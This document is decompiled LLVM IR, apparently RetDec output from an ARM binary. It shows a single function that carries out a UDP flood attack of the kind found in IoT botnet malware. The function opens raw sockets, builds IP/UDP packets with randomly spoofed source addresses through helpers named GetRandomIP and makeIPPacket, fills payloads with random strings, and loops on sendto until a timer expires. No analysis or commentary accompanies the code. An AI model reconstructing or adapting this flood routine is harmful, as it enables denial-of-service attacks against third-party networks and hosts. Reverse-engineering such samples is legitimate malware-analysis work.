  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_c794 = load i32, i32* @r4, align 4
  %v6_c794 = load i32, i32* @fp, align 4
  store i32 51100, i32* %stack_var_-4, align 4
  %v2_c798 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c798, i32* @fp, align 4
  %v2_c79c = ptrtoint i32* %stack_var_-144 to i32
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_c7c4 = icmp eq i32 %arg2, 0
  br i1 %v2_c7c4, label %dec_label_pc_c7cc, label %dec_label_pc_c7ec

dec_label_pc_c7cc:                                ; preds = %entry
  %v0_c7cc = call i32 @rand_cmwc()
  %v3_c7d4 = mul i32 %v0_c7cc, 65536
  store i32 %v3_c7d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c810

dec_label_pc_c7ec:                                ; preds = %entry
  %v3_c7f4 = urem i32 %arg2, 65536
  store i32 %v3_c7f4, i32* %r3.global-to-local, align 4
  %v1_c7fc = call i32 @htons(i32 %v3_c7f4)
  br label %dec_label_pc_c810

dec_label_pc_c810:                                ; preds = %dec_label_pc_c7cc, %dec_label_pc_c7ec
  %v2_c814 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_c814, i32* %r3.global-to-local, align 4
  %v3_c820 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-72)
  store i32 %v3_c820, i32* %r3.global-to-local, align 4
  %v2_c828 = icmp eq i32 %v3_c820, 0
  br i1 %v2_c828, label %dec_label_pc_c830, label %dec_label_pc_ce44

dec_label_pc_c830:                                ; preds = %dec_label_pc_c810
  %v2_c830 = ptrtoint i32* %stack_var_-76 to i32
  %v2_c834 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_c834, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-68, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v7_c854 = icmp eq i32 %arg4, 32
  br i1 %v7_c854, label %dec_label_pc_c85c, label %dec_label_pc_c9d8

dec_label_pc_c85c:                                ; preds = %dec_label_pc_c830
  store i32 17, i32* %r2.global-to-local, align 4
  %v0_c868 = call i32 @socket()
  store i32 %v0_c868, i32* %r3.global-to-local, align 4
  %v2_c878 = icmp eq i32 %v0_c868, 0
  br i1 %v2_c878, label %dec_label_pc_ce44, label %dec_label_pc_c880

dec_label_pc_c880:                                ; preds = %dec_label_pc_c85c
  %v3_c880 = load i32, i32* %stack_var_0, align 4
  %v1_c884 = add i32 %v3_c880, 1
  store i32 %v1_c884, i32* %r3.global-to-local, align 4
  %v1_c88c = call i32 @malloc(i32 %v1_c884)
  store i32 %v1_c88c, i32* %r3.global-to-local, align 4
  %v2_c89c = icmp eq i32 %v1_c88c, 0
  br i1 %v2_c89c, label %dec_label_pc_ce44, label %dec_label_pc_c8a4

dec_label_pc_c8a4:                                ; preds = %dec_label_pc_c880
  %v3_c8a4 = load i32, i32* %stack_var_0, align 4
  %v1_c8a8 = add i32 %v3_c8a4, 1
  store i32 %v1_c8a8, i32* @r2, align 4
  store i32 %v1_c88c, i32* %r3.global-to-local, align 4
  %v2_c8bc = inttoptr i32 %v1_c88c to i8*
  %v3_c8bc = call i32 @__GI_memset(i8* %v2_c8bc, i32 0)
  %v2_c8c8 = call i32 @makeRandomStr(i32 %v1_c88c, i32 %v3_c8a4)
  %v2_c8d0 = call i32 @__GI_time(i32* null)
  %v2_c8dc = add i32 %v2_c8d0, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_c91c = inttoptr i32 %v1_c88c to i32*
  %v3_c9a0 = mul i32 %arg8, 4
  %v3_c9b0 = mul i32 %arg8, 1000
  br label %dec_label_pc_c8f8.outer

dec_label_pc_c8f8.outer:                          ; preds = %dec_label_pc_c9c8, %dec_label_pc_c998, %dec_label_pc_c8a4
  %stack_var_-108.0.ph = phi i32 [ 0, %dec_label_pc_c8a4 ], [ %v1_c9cc, %dec_label_pc_c9c8 ], [ 0, %dec_label_pc_c998 ]
  %stack_var_-112.0.ph = phi i32 [ 0, %dec_label_pc_c8a4 ], [ %v1_c980, %dec_label_pc_c9c8 ], [ %v1_c980, %dec_label_pc_c998 ]
  br label %dec_label_pc_c8f8

dec_label_pc_c8f8:                                ; preds = %dec_label_pc_c8f8.outer, %dec_label_pc_c970
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_c970 ], [ %stack_var_-112.0.ph, %dec_label_pc_c8f8.outer ]
  %v3_c8f8 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_c830, i32* %stack_var_-144, align 4
  store i32 %v3_c8f8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_c91c = call i32 @__libc_sendto(i32 %v0_c868, i32* %v6_c91c, i32 %v3_c8f8, i32 0, i32 %v2_c830, i32 16)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_c928 = icmp eq i32 %stack_var_-112.0, %arg6
  br i1 %v9_c928, label %dec_label_pc_c930, label %dec_label_pc_c97c

dec_label_pc_c930:                                ; preds = %dec_label_pc_c8f8
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_c7c4, label %dec_label_pc_c93c, label %dec_label_pc_c958

dec_label_pc_c93c:                                ; preds = %dec_label_pc_c930
  %v0_c93c = call i32 @rand_cmwc()
  %v3_c948 = udiv i32 %v0_c93c, 256
  %v3_c9505 = urem i32 %v3_c948, 256
  store i32 %v3_c9505, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c958

dec_label_pc_c958:                                ; preds = %dec_label_pc_c930, %dec_label_pc_c93c
  %v2_c95c = call i32 @__GI_time(i32* null)
  store i32 %v2_c95c, i32* %r2.global-to-local, align 4
  store i32 %v2_c8dc, i32* %r3.global-to-local, align 4
  %v8_c96c = icmp sgt i32 %v2_c95c, %v2_c8dc
  br i1 %v8_c96c, label %dec_label_pc_ce44, label %dec_label_pc_c970

dec_label_pc_c970:                                ; preds = %dec_label_pc_c958
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c8f8

dec_label_pc_c97c:                                ; preds = %dec_label_pc_c8f8
  %v1_c980 = add i32 %stack_var_-112.0, 1
  store i32 %arg7, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-108.0.ph, i32* %r2.global-to-local, align 4
  %v9_c990 = icmp eq i32 %stack_var_-108.0.ph, %arg7
  br i1 %v9_c990, label %dec_label_pc_c998, label %dec_label_pc_c9c8

dec_label_pc_c998:                                ; preds = %dec_label_pc_c97c
  store i32 %v3_c9a0, i32* %r2.global-to-local, align 4
  store i32 %v3_c9b0, i32* %r3.global-to-local, align 4
  %v1_c9b8 = call i32 @usleep(i32 %v3_c9b0)
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c8f8.outer

dec_label_pc_c9c8:                                ; preds = %dec_label_pc_c97c
  %v1_c9cc = add i32 %stack_var_-108.0.ph, 1
  br label %dec_label_pc_c8f8.outer

dec_label_pc_c9d8:                                ; preds = %dec_label_pc_c830
  store i32 %v2_c79c, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v0_c9ec = call i32 @socket()
  store i32 %v0_c9ec, i32* %r3.global-to-local, align 4
  %v2_c9fc = icmp eq i32 %v0_c9ec, 0
  br i1 %v2_c9fc, label %dec_label_pc_ce40, label %dec_label_pc_ca08

dec_label_pc_ca08:                                ; preds = %dec_label_pc_c9d8
  store i32 1, i32* %stack_var_-80, align 4
  %v2_ca10 = ptrtoint i32* %stack_var_-80 to i32
  store i32 4, i32* %stack_var_-144, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_ca10, i32* %r3.global-to-local, align 4
  %v6_ca2c = call i32 @__GI_setsockopt(i32 %v0_c9ec, i32 0, i32 3, i32* nonnull %stack_var_-80, i32 4)
  store i32 %v6_ca2c, i32* %r3.global-to-local, align 4
  %v1_ca34 = icmp slt i32 %v6_ca2c, 0
  br i1 %v1_ca34, label %dec_label_pc_ce40, label %dec_label_pc_ca40

dec_label_pc_ca40:                                ; preds = %dec_label_pc_ca08
  store i32 49, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ca4c

dec_label_pc_ca4c:                                ; preds = %dec_label_pc_ca40, %dec_label_pc_ca4c
  %v1_ca8426 = phi i32 [ 49, %dec_label_pc_ca40 ], [ %v1_ca84, %dec_label_pc_ca4c ]
  %v2_ca50 = call i32 @__GI_time(i32* null)
  store i32 %v2_ca50, i32* %r3.global-to-local, align 4
  store i32 %v2_ca50, i32* @r4, align 4
  %v0_ca5c = call i32 @rand_cmwc()
  %v0_ca64 = load i32, i32* @r4, align 4
  %v2_ca64 = xor i32 %v0_ca64, %v0_ca5c
  store i32 %v2_ca64, i32* %r3.global-to-local, align 4
  %v1_ca6c = call i32 @srand(i32 %v2_ca64)
  %v0_ca70 = call i32 @random()
  store i32 %v0_ca70, i32* %r3.global-to-local, align 4
  %v1_ca7c = call i32 @init_rand(i32 %v0_ca70)
  %v1_ca84 = add nsw i32 %v1_ca8426, -1
  store i32 %v1_ca84, i32* %r3.global-to-local, align 4
  %v3_ca90 = icmp eq i32 %v1_ca8426, 0
  br i1 %v3_ca90, label %dec_label_pc_ca98, label %dec_label_pc_ca4c

dec_label_pc_ca98:                                ; preds = %dec_label_pc_ca4c
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_ca9c = icmp eq i32 %arg4, 0
  br i1 %v2_ca9c, label %dec_label_pc_cac8, label %dec_label_pc_cab0

dec_label_pc_cab0:                                ; preds = %dec_label_pc_ca98
  %v1_cab4 = sub i32 32, %arg4
  store i32 %v1_cab4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_cac0 = shl i32 -1, %v1_cab4
  br label %dec_label_pc_cac8

dec_label_pc_cac8:                                ; preds = %dec_label_pc_ca98, %dec_label_pc_cab0
  %storemerge12 = phi i32 [ %v1_cac0, %dec_label_pc_cab0 ], [ 0, %dec_label_pc_ca98 ]
  %v3_cac8 = load i32, i32* %stack_var_0, align 4
  %v1_cacc = add i32 %v3_cac8, 28
  %v1_cadc = add i32 %v3_cac8, 34
  %v3_cae0 = and i32 %v1_cadc, -4
  %v1_cae8 = load i32, i32* @sp, align 4
  %v2_cae8 = sub i32 %v1_cae8, %v3_cae0
  %v1_caf8 = add i32 %v2_cae8, 11
  %v3_cafc = and i32 %v1_caf8, -4
  store i32 %v3_cafc, i32* %r2.global-to-local, align 4
  %v1_cb1c = add i32 %v3_cafc, 20
  store i32 %v1_cb1c, i32* %r3.global-to-local, align 4
  %v5_cb20 = inttoptr i32 %v1_cb1c to i8*
  %v3_cb24 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_cb24, i32* @r4, align 4
  %v1_cb2c = call i32 @GetRandomIP(i32 %storemerge12)
  store i32 %v1_cb2c, i32* %r3.global-to-local, align 4
  %v1_cb38 = call i32 @htonl(i32 %v1_cb2c)
  store i32 %v1_cb38, i32* %r2.global-to-local, align 4
  %v3_cb40 = load i32, i32* %stack_var_0, align 4
  %v1_cb44 = add i32 %v3_cb40, 8
  %v1_cb48 = load i32, i32* @sp, align 4
  %v2_cb48 = inttoptr i32 %v1_cb48 to i32*
  store i32 %v1_cb44, i32* %v2_cb48, align 4
  %v0_cb50 = load i32, i32* @r4, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v4_cb58 = inttoptr i32 %v3_cafc to i8*
  %v5_cb58 = call i32 @makeIPPacket(i8* %v4_cb58, i32 %v0_cb50, i32 %v1_cb38, i32 17)
  %v3_cb5c = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_cb5c, 8
  %v3_cb70 = urem i32 %fold, 65536
  store i32 %v3_cb70, i32* %r3.global-to-local, align 4
  %v1_cb78 = call i32 @htons(i32 %v3_cb70)
  %sext = mul i32 %v1_cb78, 16777216
  %v1_cb7c = sdiv i32 %sext, 16777216
  store i32 %v1_cb7c, i32* %r3.global-to-local, align 4
  store i32 %v1_cb1c, i32* %r2.global-to-local, align 4
  %v1_cb84 = trunc i32 %v1_cb7c to i8
  %v3_cb84 = add i32 %v3_cafc, 24
  %v4_cb84 = inttoptr i32 %v3_cb84 to i8*
  store i8 %v1_cb84, i8* %v4_cb84, align 4
  %v0_cb88 = load i32, i32* %r3.global-to-local, align 4
  %v3_cb88 = sdiv i32 %v0_cb88, 256
  store i32 %v3_cb88, i32* %r3.global-to-local, align 4
  %v1_cb8c = trunc i32 %v3_cb88 to i8
  %v2_cb8c = load i32, i32* %r2.global-to-local, align 4
  %v3_cb8c = add i32 %v2_cb8c, 5
  %v4_cb8c = inttoptr i32 %v3_cb8c to i8*
  store i8 %v1_cb8c, i8* %v4_cb8c, align 1
  %v0_cb90 = call i32 @rand_cmwc()
  %v3_cb9c = urem i32 %v0_cb90, 65536
  store i32 %v3_cb9c, i32* %r3.global-to-local, align 4
  store i32 %v1_cb1c, i32* %r2.global-to-local, align 4
  %v1_cba4 = trunc i32 %v0_cb90 to i8
  store i8 %v1_cba4, i8* %v5_cb20, align 4
  %v0_cba8 = load i32, i32* %r3.global-to-local, align 4
  %v3_cba836 = udiv i32 %v0_cba8, 256
  %v1_cbac = trunc i32 %v3_cba836 to i8
  %v2_cbac = load i32, i32* %r2.global-to-local, align 4
  %v3_cbac = add i32 %v2_cbac, 1
  %v4_cbac = inttoptr i32 %v3_cbac to i8*
  store i8 %v1_cbac, i8* %v4_cbac, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_c7c4, label %dec_label_pc_cbbc, label %dec_label_pc_cbd4

dec_label_pc_cbbc:                                ; preds = %dec_label_pc_cac8
  %v0_cbbc = call i32 @rand_cmwc()
  %v3_cbc4 = mul i32 %v0_cbbc, 65536
  store i32 %v3_cbc4, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_cbbc to i8
  br label %dec_label_pc_cbf0

dec_label_pc_cbd4:                                ; preds = %dec_label_pc_cac8
  %v3_cbdc = urem i32 %arg2, 65536
  store i32 %v3_cbdc, i32* %r3.global-to-local, align 4
  %v1_cbe4 = call i32 @htons(i32 %v3_cbdc)
  %extract.t102 = trunc i32 %v1_cbe4 to i8
  br label %dec_label_pc_cbf0

dec_label_pc_cbf0:                                ; preds = %dec_label_pc_cbbc, %dec_label_pc_cbd4
  %v0_cbbc.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_cbbc ], [ %extract.t102, %dec_label_pc_cbd4 ]
  %v3_cd08.pre-phi = phi i32 [ 0, %dec_label_pc_cbbc ], [ %v3_cbdc, %dec_label_pc_cbd4 ]
  store i32 %v1_cb1c, i32* %r2.global-to-local, align 4
  %v4_cbf4 = sext i8 %v0_cbbc.sink.off0 to i32
  %v3_cbf8 = add i32 %v3_cafc, 22
  %v4_cbf8 = inttoptr i32 %v3_cbf8 to i8*
  store i8 %v0_cbbc.sink.off0, i8* %v4_cbf8, align 2
  %v3_cc0040 = udiv i32 %v4_cbf4, 256
  %v1_cc04 = trunc i32 %v3_cc0040 to i8
  %v2_cc04 = load i32, i32* %r2.global-to-local, align 4
  %v3_cc04 = add i32 %v2_cc04, 3
  %v4_cc04 = inttoptr i32 %v3_cc04 to i8*
  store i8 %v1_cc04, i8* %v4_cc04, align 1
  store i32 %v1_cb1c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_cc10 = add i32 %v3_cafc, 26
  %v4_cc10 = inttoptr i32 %v3_cc10 to i8*
  store i8 0, i8* %v4_cc10, align 2
  %v0_cc14 = load i32, i32* %r3.global-to-local, align 4
  %v1_cc14 = trunc i32 %v0_cc14 to i8
  %v2_cc14 = load i32, i32* %r2.global-to-local, align 4
  %v3_cc14 = add i32 %v2_cc14, 7
  %v4_cc14 = inttoptr i32 %v3_cc14 to i8*
  store i8 %v1_cc14, i8* %v4_cc14, align 1
  %v1_cc1c = add i32 %v3_cafc, 28
  store i32 %v1_cc1c, i32* %r3.global-to-local, align 4
  %v3_cc24 = load i32, i32* %stack_var_0, align 4
  %v2_cc28 = call i32 @makeRandomStr(i32 %v1_cc1c, i32 %v3_cc24)
  %v1_cc38 = or i32 %v3_cafc, 2
  store i32 %v1_cc38, i32* %r3.global-to-local, align 4
  %v1_cc3c = inttoptr i32 %v1_cc38 to i8*
  %v2_cc3c = load i8, i8* %v1_cc3c, align 2
  %v3_cc3c = zext i8 %v2_cc3c to i32
  store i32 %v3_cc3c, i32* %r2.global-to-local, align 4
  %v1_cc40 = or i32 %v1_caf8, 3
  %v2_cc40 = inttoptr i32 %v1_cc40 to i8*
  %v3_cc40 = load i8, i8* %v2_cc40, align 1
  %v4_cc40 = zext i8 %v3_cc40 to i32
  %v4_cc44 = mul nuw nsw i32 %v4_cc40, 256
  %v5_cc44 = or i32 %v4_cc44, %v3_cc3c
  store i32 %v5_cc44, i32* %r3.global-to-local, align 4
  %v3_cc50 = call i32 @csum(i8* %v4_cb58, i32 %v5_cc44)
  %sext6 = mul i32 %v3_cc50, 16777216
  %v1_cc54 = sdiv i32 %sext6, 16777216
  store i32 %v1_cc54, i32* %r3.global-to-local, align 4
  store i32 %v3_cafc, i32* %r2.global-to-local, align 4
  %v1_cc5c = trunc i32 %v1_cc54 to i8
  %v3_cc5c = add i32 %v3_cafc, 10
  %v4_cc5c = inttoptr i32 %v3_cc5c to i8*
  store i8 %v1_cc5c, i8* %v4_cc5c, align 2
  %v0_cc60 = load i32, i32* %r3.global-to-local, align 4
  %v3_cc60 = sdiv i32 %v0_cc60, 256
  store i32 %v3_cc60, i32* %r3.global-to-local, align 4
  %v1_cc64 = trunc i32 %v3_cc60 to i8
  %v2_cc64 = load i32, i32* %r2.global-to-local, align 4
  %v3_cc64 = add i32 %v2_cc64, 11
  %v4_cc64 = inttoptr i32 %v3_cc64 to i8*
  store i8 %v1_cc64, i8* %v4_cc64, align 1
  %v2_cc6c = call i32 @__GI_time(i32* null)
  %v2_cc78 = add i32 %v2_cc6c, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_cd48 = add i32 %v3_cafc, 4
  %v4_cd48 = inttoptr i32 %v3_cd48 to i8*
  %v2_cd70 = add i32 %v3_cafc, 12
  %v3_cd70 = inttoptr i32 %v2_cd70 to i32*
  %v3_ce08 = mul i32 %arg8, 4
  %v3_ce18 = mul i32 %arg8, 1000
  br label %dec_label_pc_cc94.outer

dec_label_pc_cc94.outer:                          ; preds = %dec_label_pc_ce30, %dec_label_pc_ce00, %dec_label_pc_cbf0
  %stack_var_-104.0.ph = phi i32 [ 0, %dec_label_pc_cbf0 ], [ %v1_cde8, %dec_label_pc_ce00 ], [ %v1_cde8, %dec_label_pc_ce30 ]
  %stack_var_-100.0.ph = phi i32 [ 0, %dec_label_pc_cbf0 ], [ 0, %dec_label_pc_ce00 ], [ %v1_ce34, %dec_label_pc_ce30 ]
  br label %dec_label_pc_cc94

dec_label_pc_cc94:                                ; preds = %dec_label_pc_cc94.outer, %dec_label_pc_cdd8
  %stack_var_-104.0 = phi i32 [ 0, %dec_label_pc_cdd8 ], [ %stack_var_-104.0.ph, %dec_label_pc_cc94.outer ]
  store i32 %v3_cafc, i32* %r2.global-to-local, align 4
  %v1_cc9c = load i32, i32* @sp, align 4
  %v2_cc9c = inttoptr i32 %v1_cc9c to i32*
  store i32 %v2_c830, i32* %v2_cc9c, align 4
  %v1_cca4 = load i32, i32* @sp, align 4
  %v2_cca4 = add i32 %v1_cca4, 4
  %v3_cca4 = inttoptr i32 %v2_cca4 to i32*
  store i32 16, i32* %v3_cca4, align 4
  %v0_ccac = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_cacc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_ccb8 = inttoptr i32 %v0_ccac to i32*
  %v7_ccb8 = call i32 @__libc_sendto(i32 %v0_c9ec, i32* %v6_ccb8, i32 %v1_cacc, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_ccbc = call i32 @rand_cmwc()
  %v3_ccc8 = urem i32 %v0_ccbc, 65536
  store i32 %v3_ccc8, i32* %r3.global-to-local, align 4
  store i32 %v1_cb1c, i32* %r2.global-to-local, align 4
  %v1_ccd0 = trunc i32 %v0_ccbc to i8
  store i8 %v1_ccd0, i8* %v5_cb20, align 4
  %v0_ccd4 = load i32, i32* %r3.global-to-local, align 4
  %v3_ccd441 = udiv i32 %v0_ccd4, 256
  %v1_ccd8 = trunc i32 %v3_ccd441 to i8
  %v2_ccd8 = load i32, i32* %r2.global-to-local, align 4
  %v3_ccd8 = add i32 %v2_ccd8, 1
  %v4_ccd8 = inttoptr i32 %v3_ccd8 to i8*
  store i8 %v1_ccd8, i8* %v4_ccd8, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_c7c4, label %dec_label_pc_cce8, label %dec_label_pc_cd00

dec_label_pc_cce8:                                ; preds = %dec_label_pc_cc94
  %v0_cce8 = call i32 @rand_cmwc()
  %v3_ccf0 = mul i32 %v0_cce8, 65536
  store i32 %v3_ccf0, i32* %r3.global-to-local, align 4
  %extract.t103 = trunc i32 %v0_cce8 to i8
  br label %dec_label_pc_cd1c

dec_label_pc_cd00:                                ; preds = %dec_label_pc_cc94
  store i32 %v3_cd08.pre-phi, i32* %r3.global-to-local, align 4
  %v1_cd10 = call i32 @htons(i32 %v3_cd08.pre-phi)
  %extract.t104 = trunc i32 %v1_cd10 to i8
  br label %dec_label_pc_cd1c

dec_label_pc_cd1c:                                ; preds = %dec_label_pc_cce8, %dec_label_pc_cd00
  %v0_cce8.sink.off0 = phi i8 [ %extract.t103, %dec_label_pc_cce8 ], [ %extract.t104, %dec_label_pc_cd00 ]
  store i32 %v1_cb1c, i32* %r2.global-to-local, align 4
  %v4_cd20 = sext i8 %v0_cce8.sink.off0 to i32
  store i8 %v0_cce8.sink.off0, i8* %v4_cbf8, align 2
  %v3_cd2c = sdiv i32 %v4_cd20, 256
  store i32 %v3_cd2c, i32* %r3.global-to-local, align 4
  %v1_cd30 = trunc i32 %v3_cd2c to i8
  %v2_cd30 = load i32, i32* %r2.global-to-local, align 4
  %v3_cd30 = add i32 %v2_cd30, 3
  %v4_cd30 = inttoptr i32 %v3_cd30 to i8*
  store i8 %v1_cd30, i8* %v4_cd30, align 1
  %v0_cd34 = call i32 @rand_cmwc()
  %v3_cd40 = urem i32 %v0_cd34, 65536
  store i32 %v3_cd40, i32* %r3.global-to-local, align 4
  store i32 %v3_cafc, i32* %r2.global-to-local, align 4
  %v1_cd48 = trunc i32 %v0_cd34 to i8
  store i8 %v1_cd48, i8* %v4_cd48, align 4
  %v0_cd4c = load i32, i32* %r3.global-to-local, align 4
  %v3_cd4c = sdiv i32 %v0_cd4c, 256
  store i32 %v3_cd4c, i32* %r3.global-to-local, align 4
  %v1_cd50 = trunc i32 %v3_cd4c to i8
  %v2_cd50 = load i32, i32* %r2.global-to-local, align 4
  %v3_cd50 = add i32 %v2_cd50, 5
  %v4_cd50 = inttoptr i32 %v3_cd50 to i8*
  store i8 %v1_cd50, i8* %v4_cd50, align 1
  %v1_cd58 = call i32 @GetRandomIP(i32 %storemerge12)
  store i32 %v1_cd58, i32* %r3.global-to-local, align 4
  %v1_cd64 = call i32 @htonl(i32 %v1_cd58)
  store i32 %v1_cd64, i32* %r2.global-to-local, align 4
  store i32 %v1_cd64, i32* %v3_cd70, align 4
  store i32 %v1_cc38, i32* %r3.global-to-local, align 4
  %v2_cd84 = load i8, i8* %v1_cc3c, align 2
  %v3_cd84 = zext i8 %v2_cd84 to i32
  store i32 %v3_cd84, i32* %r2.global-to-local, align 4
  %v3_cd88 = load i8, i8* %v2_cc40, align 1
  %v4_cd88 = zext i8 %v3_cd88 to i32
  %v4_cd8c = mul nuw nsw i32 %v4_cd88, 256
  %v5_cd8c = or i32 %v4_cd8c, %v3_cd84
  store i32 %v5_cd8c, i32* %r3.global-to-local, align 4
  %v3_cd98 = call i32 @csum(i8* %v4_cb58, i32 %v5_cd8c)
  %sext7 = mul i32 %v3_cd98, 16777216
  %v1_cd9c = sdiv i32 %sext7, 16777216
  store i32 %v1_cd9c, i32* %r3.global-to-local, align 4
  store i32 %v3_cafc, i32* %r2.global-to-local, align 4
  %v1_cda4 = trunc i32 %v1_cd9c to i8
  store i8 %v1_cda4, i8* %v4_cc5c, align 2
  %v0_cda8 = load i32, i32* %r3.global-to-local, align 4
  %v3_cda845 = udiv i32 %v0_cda8, 256
  %v1_cdac = trunc i32 %v3_cda845 to i8
  %v2_cdac = load i32, i32* %r2.global-to-local, align 4
  %v3_cdac = add i32 %v2_cdac, 11
  %v4_cdac = inttoptr i32 %v3_cdac to i8*
  store i8 %v1_cdac, i8* %v4_cdac, align 1
  store i32 %stack_var_-104.0, i32* %r2.global-to-local, align 4
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v9_cdb8 = icmp eq i32 %stack_var_-104.0, %arg6
  br i1 %v9_cdb8, label %dec_label_pc_cdc0, label %dec_label_pc_cde4

dec_label_pc_cdc0:                                ; preds = %dec_label_pc_cd1c
  %v2_cdc4 = call i32 @__GI_time(i32* null)
  store i32 %v2_cdc4, i32* %r2.global-to-local, align 4
  store i32 %v2_cc78, i32* %r3.global-to-local, align 4
  %v8_cdd4 = icmp sgt i32 %v2_cdc4, %v2_cc78
  br i1 %v8_cdd4, label %dec_label_pc_ce40, label %dec_label_pc_cdd8

dec_label_pc_cdd8:                                ; preds = %dec_label_pc_cdc0
  br label %dec_label_pc_cc94

dec_label_pc_cde4:                                ; preds = %dec_label_pc_cd1c
  %v1_cde8 = add i32 %stack_var_-104.0, 1
  store i32 %v1_cde8, i32* %r2.global-to-local, align 4
  store i32 %arg7, i32* %r3.global-to-local, align 4
  %v9_cdf8 = icmp eq i32 %stack_var_-100.0.ph, %arg7
  br i1 %v9_cdf8, label %dec_label_pc_ce00, label %dec_label_pc_ce30

dec_label_pc_ce00:                                ; preds = %dec_label_pc_cde4
  store i32 %v3_ce08, i32* %r2.global-to-local, align 4
  store i32 %v3_ce18, i32* %r3.global-to-local, align 4
  %v1_ce20 = call i32 @usleep(i32 %v3_ce18)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_cc94.outer

dec_label_pc_ce30:                                ; preds = %dec_label_pc_cde4
  %v1_ce34 = add i32 %stack_var_-100.0.ph, 1
  store i32 %v1_ce34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cc94.outer

dec_label_pc_ce40:                                ; preds = %dec_label_pc_cdc0, %dec_label_pc_ca08, %dec_label_pc_c9d8
  %v12_ce4833 = phi i32 [ %v6_ca2c, %dec_label_pc_ca08 ], [ 0, %dec_label_pc_c9d8 ], [ %v2_cdc4, %dec_label_pc_cdc0 ]
  br label %dec_label_pc_ce44

dec_label_pc_ce44:                                ; preds = %dec_label_pc_c958, %dec_label_pc_c810, %dec_label_pc_c880, %dec_label_pc_c85c, %dec_label_pc_ce40
  %v12_ce48 = phi i32 [ %v3_c820, %dec_label_pc_c810 ], [ 0, %dec_label_pc_c880 ], [ 0, %dec_label_pc_c85c ], [ %v12_ce4833, %dec_label_pc_ce40 ], [ %v2_c95c, %dec_label_pc_c958 ]
  store i32 %v3_c794, i32* @r4, align 4
  store i32 %v6_c794, i32* @fp, align 4
  ret i32 %v12_ce48

; uselistorder directives
  uselistorder i32 %v1_ce34, { 1, 0 }
  uselistorder i32 %v1_cde8, { 2, 1, 0 }
  uselistorder i32 %v1_cd9c, { 1, 0 }
  uselistorder i32 %v3_cd4c, { 1, 0 }
  uselistorder i32 %v0_cd34, { 1, 0 }
  uselistorder i32 %v3_cd2c, { 1, 0 }
  uselistorder i8 %v0_cce8.sink.off0, { 1, 0 }
  uselistorder i32 %v0_cce8, { 1, 0 }
  uselistorder i32 %v0_ccbc, { 1, 0 }
  uselistorder i32 %stack_var_-104.0, { 0, 2, 1 }
  uselistorder i32 %v3_ce18, { 1, 0 }
  uselistorder i32 %v2_cc78, { 1, 0 }
  uselistorder i32 %v3_cc60, { 1, 0 }
  uselistorder i32 %v1_cc54, { 1, 0 }
  uselistorder i32 %v1_cc38, { 0, 2, 1 }
  uselistorder i32 %v3_cd08.pre-phi, { 1, 0 }
  uselistorder i8 %v0_cbbc.sink.off0, { 1, 0 }
  uselistorder i32 %v3_cbdc, { 2, 1, 0 }
  uselistorder i32 %v0_cbbc, { 1, 0 }
  uselistorder i32 %v0_cb90, { 1, 0 }
  uselistorder i32 %v3_cb88, { 1, 0 }
  uselistorder i32 %v1_cb7c, { 1, 0 }
  uselistorder i32 %v3_cb70, { 1, 0 }
  uselistorder i32 %v3_cafc, { 9, 7, 5, 8, 6, 3, 4, 14, 13, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_cacc, { 1, 0 }
  uselistorder i32 %v1_ca84, { 1, 0 }
  uselistorder i32 %v1_c980, { 1, 0 }
  uselistorder i32 %v3_c8f8, { 1, 0 }
  uselistorder i32 %stack_var_-108.0.ph, { 1, 2, 0 }
  uselistorder i32 %v3_c9b0, { 1, 0 }
  uselistorder i32 %v2_c8dc, { 1, 0 }
  uselistorder i32 %v1_c88c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v2_c830, { 1, 0, 2 }
  uselistorder i32 %v3_c7f4, { 1, 0 }
